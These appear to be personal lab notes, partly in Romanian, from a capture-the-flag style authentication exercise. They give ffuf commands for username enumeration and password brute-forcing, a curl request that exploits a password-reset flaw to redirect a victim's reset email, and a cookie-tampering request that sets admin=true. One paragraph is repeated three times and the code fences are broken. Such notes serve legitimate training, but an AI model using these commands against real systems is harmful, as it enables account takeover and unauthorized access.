<h2>Username Enumeration</h2>
````
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt 
-X POST (request method)
-d "username=FUZZ&email=x&password=x&cpassword=x" (data we are going to send)
-H "Content-Type: application/x-www-form-urlencoded" (adding additional headers)
-u http://10.10.215.208/customers/signup (URL)
-mr "username already exists" (text on page to see if we've found a valid username)
````
<h2>Brute Force</h2>
````
ffuf 
-w valid_usernames.txt:W1, (valid username list)
	/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2  (password list)
-X POST (request method)
-d "username=W1&password=W2" (data we're going to send)
-H "Content-Type: application/x-www-form-urlencoded" (additional headers)
-u http://10.10.215.208/customers/login (URL)
-fc 200 (check for HTTP code other than 200)
````

<h2>Logic Flaws</h2>
Orice aplicatie poate avea greseli in cum e scrisa prin care codul php interactioneaza direct cu datele trimise de noi prin POST. Poti testa fiecare field(username, parola, email, etc.) pana cand gasesti unul exploitabil.
De exemplu, daca un site are in url `?email=x@gmail.com` la un forgot password request unde cere si un username, atunci poti sa trimiti in request emailul tau sa fie folosit ca recipient al mesajului de schimbare a adresei.

De exemplu, daca un site are in url `?email=x@gmail.com` la un forgot password request unde cere si un username, atunci poti sa trimiti in request emailul tau sa fie folosit ca recipient al mesajului de schimbare a adresei.

De exemplu, daca un site are in url `?email=x@gmail.com` la un forgot password request unde cere si un username, atunci poti sa trimiti in request emailul tau sa fie folosit ca recipient al mesajului de schimbare a adresei.
```
curl 'http://10.10.215.208/customers/reset?email=robert@acmeitsupport.thm' (pagina cu emailul victimei)
-H 'Content-Type: application/x-www-form-urlencoded' 
-d 'username=robert&email={username}@customer.acmeitsupport.thm' (emailul tau)
`````
``
<h2>Cookie Tampering</h2>
Uneori, daca cookieurile sunt in plaintext si este evident ce fac, se pot face cereri la pagina schimbad cookieurile direct in head.
```
curl 
-H "Cookie: logged_in=true; admin=true" 
http://10.10.215.208/cookie-test
```

Daca cookieurile sunt hashate sau codate, poti sa incerci sa le crackezi.